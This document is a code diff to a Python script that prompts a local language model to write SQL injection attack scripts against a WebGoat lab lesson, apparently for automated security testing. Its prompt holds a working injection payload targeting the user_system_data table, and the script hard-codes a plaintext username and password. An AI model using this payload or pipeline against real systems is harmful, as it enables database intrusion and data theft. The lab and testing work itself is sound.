@@ -23,21 +23,21 @@ RULES:
 INSTRUCTIONS:
 
 1. Import the "requests" module to handle HTTP requests. Do NOT use the BeautifulSoup (bs4) library. Do NOT use dict_from_cookiejar from requests.utils library. This is very important.
-2. Define the base URL: {base_url} and login URL according to the base URL given by the user. For example, the login URL should be: f'{base_url}/login'.
+2. Define the base URL: {base_url} and login URL according to the base URL given by the user. For example, the login URL should be: f'{base_url}/login'. Also define the vulnerable url as {vulnerable_url} and the session_url as {session_url}
 3. Create a session to persist cookies across requests. 
 4. Retrieve the login page content.
 5. Define the user credentials with the provided username: {username} and password: {password}.
 6. Submit the login details to the login URL to authenticate. allow_redirects=True MUST be there.
-7. Check if the login is successful. Ensure the response does NOT contain the text "Invalid username and password" and has a status code of 200.
-8. Define the vulnerable endpoint for the SQL injection attack: {vulnerable_url}. Access the lesson page to set up the attack using session.get(f'{base_url}SqlInjectionAdvanced.lesson.lesson').
+7. Check if the login is successful. Ensure the response does NOT contain the text "Invalid username and password" and has a status code of 200. 
+8. Access the lesson page to set up the attack by creating a variable lesson_page which uses session.get({session_url}). You need to acces session url here.
 9. Create a payload for the SQL injection attack. Remember that the successful payload is "cyber';/**/select/**/*/**/from/**/user_system_data;--". Do not use any other payload.
 10. Create a dictionary attack_data with the payload. The dictionary should contain a field called "userid_6a".
 11. Perform the SQL injection attack using session.post(vulnerable_url, data=attack_data). 
 12. Check if the attack was successful by looking for specific keywords in the response. You MUST NOT access the cookies, get the data from response.json(). The attack is successful if "lessonCompleted" is in response_data and response_data["lessonCompleted"]:
         feedback = response_data["feedback"]
         output = response_data["output"]
-13. Print the feedback and output, indicating the attack was successful.
-14. Close the session to end the interaction with the server.
+14. Print the feedback and output, indicating the attack was successful.
+15. Close the session to end the interaction with the server.
 
 Maintain a step-by-step approach and focus on achieving your goals with diligence and precision.
 This work is very important and requires attention to detail and methodical execution.
@@ -45,7 +45,7 @@ Take a deep breath, think step by step, and then do the task.
 """
 
 # Default user/human prompt for generating test cases
-generate_attack_human = "Generate a python script for doing an sql injection attack. The application base url is {base_url}, vulnerable endpoint is {vulnerable_url}, username is {username} and password is {password}"
+generate_attack_human = "Generate a python script for doing an sql injection attack. The application base url is {base_url}, vulnerable endpoint is {vulnerable_url}, session url is {session_url}, username is {username} and password is {password}"
 
 from langchain_openai import OpenAI
 from langchain_core.prompts import ChatPromptTemplate 
@@ -54,7 +54,7 @@ import re
 llm = OpenAI(base_url="http://localhost:1234/v1", api_key="lm-studio", max_tokens=1000, temperature=0)
 
 
-def generate_attack_vector(base_url, vulnerable_url, username, password):
+def generate_attack_vector(base_url, vulnerable_url, session_url, username, password):
     sys_message = generate_attack_sys
     human_message = generate_attack_human
 
@@ -70,7 +70,7 @@ def generate_attack_vector(base_url, vulnerable_url, username, password):
     print(vulnerable_url)
     print(username)
     print("*****************************")
-    out = chain.invoke({'username': username, 'password': password, 'base_url': base_url, 'vulnerable_url': vulnerable_url})
+    out = chain.invoke({'username': username, 'password': password, 'base_url': base_url, 'vulnerable_url': vulnerable_url, 'session_url': session_url})
     test_cases = out
     print(test_cases)
     import logging
@@ -106,8 +106,8 @@ base_url = "http://127.0.0.1:8080/WebGoat/"
 username = "sbombatkar"
 password = "Sneha#1234"
 vulnerable_url = "http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/attack6a"
-
-output = generate_attack_vector(base_url, vulnerable_url, username, password)
+session_url = "http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced.lesson.lesson"
+output = generate_attack_vector(base_url, vulnerable_url, session_url, username, password)
 
 
 
